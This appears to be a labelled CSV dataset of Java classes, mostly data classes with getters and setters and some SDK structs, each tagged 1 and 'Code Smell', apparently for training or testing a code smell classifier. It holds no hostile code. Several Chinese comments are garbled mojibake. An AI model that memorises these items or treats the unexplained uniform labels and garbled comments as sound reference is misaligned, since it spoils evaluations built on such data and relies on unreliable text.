text,label,text_label
"public static class NET_IN_RADIOMETRY_DOFIND extends SdkStructure {
  public int dwSize;
  public int nFinderHanle;
  public int nBeginNumber;
  public int nCount;
  public NET_IN_RADIOMETRY_DOFIND(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public class CredentialType {
  public static final String ACCESS_KEY=""access_key"";
  public static final String STS=""sts"";
  public static final String ECS_RAM_ROLE=""ecs_ram_role"";
  public static final String RAM_ROLE_ARN=""ram_role_arn"";
}
",1,Code Smell
"public final class GProDirectMsgReport {
  long guildId;
  byte[] meta;
  long readCntSeq;
  long readCntTime;
  long readMsgSeq;
  long readMsgTime;
  public GProDirectMsgReport(){
    this.meta=new byte[0];
  }
  public long getGuildId(){
    return this.guildId;
  }
  public byte[] getMeta(){
    return this.meta;
  }
  public long getReadCntSeq(){
    return this.readCntSeq;
  }
  public long getReadCntTime(){
    return this.readCntTime;
  }
  public long getReadMsgSeq(){
    return this.readMsgSeq;
  }
  public long getReadMsgTime(){
    return this.readMsgTime;
  }
  public String toString(){
    return ""GProDirectMsgReport{guildId="" + this.guildId + "",readMsgSeq=""+ this.readMsgSeq+ "",readMsgTime=""+ this.readMsgTime+ "",readCntSeq=""+ this.readCntSeq+ "",readCntTime=""+ this.readCntTime+ "",meta=""+ this.meta+ "",}"";
  }
  public GProDirectMsgReport(  long j2,  long j3,  long j4,  long j5,  long j6,  byte[] bArr){
    this.meta=new byte[0];
    this.guildId=j2;
    this.readMsgSeq=j3;
    this.readMsgTime=j4;
    this.readCntSeq=j5;
    this.readCntTime=j6;
    this.meta=bArr;
  }
}",1,Code Smell
"/** 
 * @author sanyue
 * @date 2018/9/13
 */
public class KafkaWriterParam extends DaPluginParam {
  private List<String> tableFields;
  protected boolean dataSequence;
  private String topic;
  protected List<String> partitionKey;
  private Map<String,String> kafkaSettings;
  private String zookeeperConnect;
  private String bootstrapServers;
  /** 
 * json銆乼ext
 */
  private String codec;
  public List<String> getTableFields(){
    return tableFields;
  }
  public void setTableFields(  List<String> tableFields){
    this.tableFields=tableFields;
  }
  public boolean isDataSequence(){
    return dataSequence;
  }
  public void setDataSequence(  boolean dataSequence){
    this.dataSequence=dataSequence;
  }
  public String getTopic(){
    return topic;
  }
  public void setTopic(  String topic){
    this.topic=topic;
  }
  public List<String> getPartitionKey(){
    return partitionKey;
  }
  public void setPartitionKey(  List<String> partitionKey){
    this.partitionKey=partitionKey;
  }
  public Map<String,String> getKafkaSettings(){
    return kafkaSettings;
  }
  public void setKafkaSettings(  Map<String,String> kafkaSettings){
    this.kafkaSettings=kafkaSettings;
  }
  public String getZookeeperConnect(){
    return zookeeperConnect;
  }
  public void setZookeeperConnect(  String zookeeperConnect){
    this.zookeeperConnect=zookeeperConnect;
  }
  public String getBootstrapServers(){
    return bootstrapServers;
  }
  public void setBootstrapServers(  String bootstrapServers){
    this.bootstrapServers=bootstrapServers;
  }
  public String getCodec(){
    return codec;
  }
  public void setCodec(  String codec){
    this.codec=codec;
  }
}",1,Code Smell
"/** 
 * 鍙戦�佹祦鍋滄浜嬩欢
 */
public class MediaSendRtpStoppedEvent extends ApplicationEvent {
  public MediaSendRtpStoppedEvent(  Object source){
    super(source);
  }
  private String app;
  private String stream;
  private MediaServer mediaServer;
  public static MediaSendRtpStoppedEvent getInstance(  Object source,  OnStreamNotFoundHookParam hookParam,  MediaServer mediaServer){
    MediaSendRtpStoppedEvent mediaDepartureEven=new MediaSendRtpStoppedEvent(source);
    mediaDepartureEven.setApp(hookParam.getApp());
    mediaDepartureEven.setStream(hookParam.getStream());
    mediaDepartureEven.setMediaServer(mediaServer);
    return mediaDepartureEven;
  }
  public String getApp(){
    return app;
  }
  public void setApp(  String app){
    this.app=app;
  }
  public String getStream(){
    return stream;
  }
  public void setStream(  String stream){
    this.stream=stream;
  }
  public MediaServer getMediaServer(){
    return mediaServer;
  }
  public void setMediaServer(  MediaServer mediaServer){
    this.mediaServer=mediaServer;
  }
}
",1,Code Smell
"public static class NET_SMART_KITCHEN_CLOTHES_DETECTION_RULE_INFO extends SdkStructure {
  public int dwSize;
  public int bMaskEnable;
  public int bChefHatEnable;
  public int bChefClothesEnable;
  public int nChefClothesColorNum;
  public int[] emChefClothesColors=new int[8];
  public int nReportInterval;
  public byte[] byReserved=new byte[4096];
  public NET_SMART_KITCHEN_CLOTHES_DETECTION_RULE_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * CacheCluster
 */
public class CacheClusterObject {
  private String name;
  private String token;
  private String zone;
  private Map<String,String> params=new HashMap<>();
  /** 
 * get name
 * @return the name
 */
  public String getName(){
    return name;
  }
  /** 
 * set name
 * @param name the name to set
 */
  public void setName(  String name){
    this.name=name;
  }
  /** 
 * get zone
 * @return the zone
 */
  public String getZone(){
    return zone;
  }
  /** 
 * set zone
 * @param zone the zone to set
 */
  public void setZone(  String zone){
    this.zone=zone;
  }
  /** 
 * get token
 * @return the token
 */
  public String getToken(){
    return token;
  }
  /** 
 * set token
 * @param token the token to set
 */
  public void setToken(  String token){
    this.token=token;
  }
  /** 
 * get params
 * @return the params
 */
  public Map<String,String> getParams(){
    return params;
  }
  /** 
 * set params
 * @param params the params to set
 */
  public void setParams(  Map<String,String> params){
    this.params=params;
  }
}
",1,Code Smell
"@ConfigurationProperties(prefix=""magic-api.resource.git"") public class MagicGitProperties {
  /** 
 * git浠撳簱鍦板潃
 */
  private String url;
  /** 
 * git鍒嗘敮
 */
  private String branch;
  /** 
 * ssh 瀵嗛挜鍦板潃 浠呮敮鎸�-m PEM鍙傛暟鐢熶骇鐨剆sh key
 */
  private String privateKey;
  /** 
 * git璐﹀彿
 */
  private String username;
  /** 
 * git瀵嗙爜
 */
  private String password;
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
  public String getBranch(){
    return branch;
  }
  public void setBranch(  String branch){
    this.branch=branch;
  }
  public String getPrivateKey(){
    return privateKey;
  }
  public void setPrivateKey(  String privateKey){
    this.privateKey=privateKey;
  }
  public String getUsername(){
    return username;
  }
  public void setUsername(  String username){
    this.username=username;
  }
  public String getPassword(){
    return password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
}
",1,Code Smell
"/** 
 * 搴旂敤妯″潡: <p> 绫绘弿杩�: 鐢ㄦ埛淇℃伅 <p>
 * @author darryrzhoong
 * @since 2020-01-27
 */
public class UserInfo implements Serializable {
  @NonNull private String uuid;
  private String birthday;
  private String sex;
  private String accessToken;
  private String refreshToken;
  private String tokenExpireTime;
  private int type;
  private String name;
  private String email;
  private String phone;
  private String signature;
  private String avatarRemoteUrl;
  private ThirdAccount[] thirdAccounts;
  private String regionId;
public class ThirdAccount implements Serializable {
    public String avatarUrl;
    public String nickName;
    public String openId;
    public int thirdType;
    public String token;
    public String unionId;
    public String email;
  }
  private UserInfo(){
    throw new UnsupportedOperationException(""Do not instantiate"");
  }
  public static UserInfo getInstance(){
    return UserHolder.INSTANCE;
  }
private static class UserHolder {
    private static final UserInfo INSTANCE=new UserInfo();
  }
  @NonNull public String getUuid(){
    return uuid;
  }
  public void setUuid(  @NonNull String uuid){
    this.uuid=uuid;
  }
  public String getBirthday(){
    return birthday;
  }
  public void setBirthday(  String birthday){
    this.birthday=birthday;
  }
  public String getSex(){
    return sex;
  }
  public void setSex(  String sex){
    this.sex=sex;
  }
  public String getAccessToken(){
    return accessToken;
  }
  public void setAccessToken(  String accessToken){
    this.accessToken=accessToken;
  }
  public String getRefreshToken(){
    return refreshToken;
  }
  public void setRefreshToken(  String refreshToken){
    this.refreshToken=refreshToken;
  }
  public String getTokenExpireTime(){
    return tokenExpireTime;
  }
  public void setTokenExpireTime(  String tokenExpireTime){
    this.tokenExpireTime=tokenExpireTime;
  }
  public int getType(){
    return type;
  }
  public void setType(  int type){
    this.type=type;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getEmail(){
    return email;
  }
  public void setEmail(  String email){
    this.email=email;
  }
  public String getPhone(){
    return phone;
  }
  public void setPhone(  String phone){
    this.phone=phone;
  }
  public String getSignature(){
    return signature;
  }
  public void setSignature(  String signature){
    this.signature=signature;
  }
  public String getAvatarRemoteUrl(){
    return avatarRemoteUrl;
  }
  public void setAvatarRemoteUrl(  String avatarRemoteUrl){
    this.avatarRemoteUrl=avatarRemoteUrl;
  }
  public ThirdAccount[] getThirdAccounts(){
    return thirdAccounts;
  }
  public void setThirdAccounts(  ThirdAccount[] thirdAccounts){
    this.thirdAccounts=thirdAccounts;
  }
  public String getRegionId(){
    return regionId;
  }
  public void setRegionId(  String regionId){
    this.regionId=regionId;
  }
}",1,Code Smell
"public class AccountTreeDTO {
  private List<ProjectVo> projectVoList;
  private List<ServerVo> serverAccount;
  private List<ImageVo> imageAccount;
  private List<CodeVo> codeAccount;
  private List<K8sVo> k8sAccount;
  private List<ConfigVo> configAccount;
  private List<FileSystemVo> fsAccount;
  public List<ProjectVo> getProjectVoList(){
    return projectVoList;
  }
  public void setProjectVoList(  List<ProjectVo> projectVoList){
    this.projectVoList=projectVoList;
  }
  public List<ServerVo> getServerAccount(){
    return serverAccount;
  }
  public void setServerAccount(  List<ServerVo> serverAccount){
    this.serverAccount=serverAccount;
  }
  public List<ImageVo> getImageAccount(){
    return imageAccount;
  }
  public void setImageAccount(  List<ImageVo> imageAccount){
    this.imageAccount=imageAccount;
  }
  public List<CodeVo> getCodeAccount(){
    return codeAccount;
  }
  public void setCodeAccount(  List<CodeVo> codeAccount){
    this.codeAccount=codeAccount;
  }
  public List<K8sVo> getK8sAccount(){
    return k8sAccount;
  }
  public void setK8sAccount(  List<K8sVo> k8sAccount){
    this.k8sAccount=k8sAccount;
  }
  public List<ConfigVo> getConfigAccount(){
    return configAccount;
  }
  public void setConfigAccount(  List<ConfigVo> configAccount){
    this.configAccount=configAccount;
  }
  public List<FileSystemVo> getFsAccount(){
    return fsAccount;
  }
  public void setFsAccount(  List<FileSystemVo> fsAccount){
    this.fsAccount=fsAccount;
  }
}",1,Code Smell
"public static class EVENT_INFO extends SdkStructure {
  public int nEvent;
  public int[] arrayObejctType=new int[16];
  public int nObjectCount;
  public byte[] byReserved=new byte[512];
}",1,Code Smell
"public final class EmojiReplyElement implements Serializable {
  int emojiId;
  int emojiType;
  long msgId;
  long msgSeq;
  long serialVersionUID=1;
  long tinyId;
  public EmojiReplyElement(){
  }
  public int getEmojiId(){
    return this.emojiId;
  }
  public int getEmojiType(){
    return this.emojiType;
  }
  public long getMsgId(){
    return this.msgId;
  }
  public long getMsgSeq(){
    return this.msgSeq;
  }
  public long getTinyId(){
    return this.tinyId;
  }
  public String toString(){
    return ""EmojiReplyElement{tinyId="" + this.tinyId + "",msgSeq=""+ this.msgSeq+ "",msgId=""+ this.msgId+ "",emojiId=""+ this.emojiId+ "",emojiType=""+ this.emojiType+ "",}"";
  }
  public EmojiReplyElement(  long j2,  long j3,  long j4,  int i2,  int i3){
    this.tinyId=j2;
    this.msgSeq=j3;
    this.msgId=j4;
    this.emojiId=i2;
    this.emojiType=i3;
  }
}",1,Code Smell
"/** 
 * 妯″潡鏉冮檺闆嗐
 * @author datagear@163.com
 */
public class ModulePermissions implements Serializable {
  private static final long serialVersionUID=1L;
  private ModulePermission schemaPermission;
  private ModulePermission analysisProjectPermission;
  private ModulePermission dataSetPermission;
  private ModulePermission chartPermission;
  private ModulePermission dashboardPermission;
  public ModulePermissions(){
    super();
  }
  public ModulePermissions(  ModulePermission schemaPermission,  ModulePermission analysisProjectPermission,  ModulePermission dataSetPermission,  ModulePermission chartPermission,  ModulePermission dashboardPermission){
    super();
    this.schemaPermission=schemaPermission;
    this.analysisProjectPermission=analysisProjectPermission;
    this.dataSetPermission=dataSetPermission;
    this.chartPermission=chartPermission;
    this.dashboardPermission=dashboardPermission;
  }
  public ModulePermission getSchemaPermission(){
    return schemaPermission;
  }
  public void setSchemaPermission(  ModulePermission schemaPermission){
    this.schemaPermission=schemaPermission;
  }
  public ModulePermission getAnalysisProjectPermission(){
    return analysisProjectPermission;
  }
  public void setAnalysisProjectPermission(  ModulePermission analysisProjectPermission){
    this.analysisProjectPermission=analysisProjectPermission;
  }
  public ModulePermission getDataSetPermission(){
    return dataSetPermission;
  }
  public void setDataSetPermission(  ModulePermission dataSetPermission){
    this.dataSetPermission=dataSetPermission;
  }
  public ModulePermission getChartPermission(){
    return chartPermission;
  }
  public void setChartPermission(  ModulePermission chartPermission){
    this.chartPermission=chartPermission;
  }
  public ModulePermission getDashboardPermission(){
    return dashboardPermission;
  }
  public void setDashboardPermission(  ModulePermission dashboardPermission){
    this.dashboardPermission=dashboardPermission;
  }
}",1,Code Smell
